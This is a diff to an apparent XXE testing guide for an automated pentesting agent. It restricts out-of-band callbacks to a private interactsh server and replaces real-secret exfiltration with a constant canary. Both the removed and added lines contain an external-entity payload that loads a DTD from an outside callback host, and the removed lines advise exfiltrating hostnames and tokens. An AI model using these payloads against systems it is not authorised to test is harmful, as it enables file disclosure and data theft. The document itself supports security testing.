@@ -48,10 +48,14 @@ XML External Entity injection is a parser-level failure that enables local file 
 ### OAST
 
 - Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
-- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)
-- Use `interactsh-client -v` for the callback domain. Reference it as the
-  external DTD host (e.g. `<!ENTITY % ex SYSTEM "http://xyz.oast.fun/x.dtd">`)
-  and read the DNS/HTTP hit on the interactsh stdout.
+- Only use a private callback server: when `$STRIX_OAST_SERVER` is set, run
+  `interactsh-client -server "$STRIX_OAST_SERVER" ${STRIX_OAST_TOKEN:+-token "$STRIX_OAST_TOKEN"} -v` and reference the minted domain as the external DTD host (e.g.
+  `<!ENTITY % ex SYSTEM "http://<callback-domain>/x.dtd">`), then read the
+  DNS/HTTP hit on the interactsh stdout. Never use interactsh's public
+  `oast.*` servers; if `$STRIX_OAST_SERVER` is unset, use error and timing
+  oracles instead.
+- Prove the blind channel with a constant canary; do not exfiltrate real file
+  contents, hostnames or tokens through the callback.
 
 ### Timing
 
